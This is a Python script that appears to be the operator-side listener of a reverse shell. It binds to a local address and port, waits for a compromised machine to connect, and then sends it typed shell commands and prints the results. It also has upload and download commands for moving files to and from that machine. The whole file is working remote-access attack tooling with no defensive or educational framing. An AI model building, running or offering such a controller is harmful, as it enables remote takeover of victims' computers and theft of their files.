import socket 

class bcolors:
    
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    ENDC = '\033[0m'

def download_file(command):

    file_name = command[9:]
    file_bytes = b""

    conn.settimeout(1)

    while True:
        try:
            data = conn.recv(1024)
        except socket.timeout:
            break

        if file_bytes[-5:] == b"<END>":
            break
        else:
            file_bytes += data

    conn.settimeout(None)

    file = open(file_name,"wb")
    file.write(file_bytes)
    file.close()

def upload_file(file_name):

    with open(file_name,"rb") as file:
        data = file.read()
    
    conn.send(data)
    conn.send(b"<END>")

    file.close()

if __name__ == '__main__':

    HOST = "192.168.1.104"
    PORT = 5549

    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.bind((HOST,PORT))
    sock.listen()
    
    conn,addr = sock.accept()

    print(bcolors.OKGREEN + "[+] Connected by " + addr[0] + bcolors.ENDC)
    
    while True:

        try:
            command = input(bcolors.OKCYAN + "[" + addr[0] + "]" + " @shell ~ " + bcolors.ENDC)
            try:
                conn.send(command.encode())
            except:
                pass
            
            if command[:6] == "upload":
                
                upload_file(command[7:])
            
            if command[:8] == "download":
                download_file(command)

            if command == "exit":
                print(bcolors.WARNING + "\n[-] QUIT" + bcolors.ENDC)
                break
                
            if command[:2] != "cd" and command[:6] != "upload" and command[:8] != "download":
                data = conn.recv(1024)
                print(data.decode())

        except KeyboardInterrupt:
            print(bcolors.WARNING + "\n[-] QUIT" + bcolors.ENDC)
            break
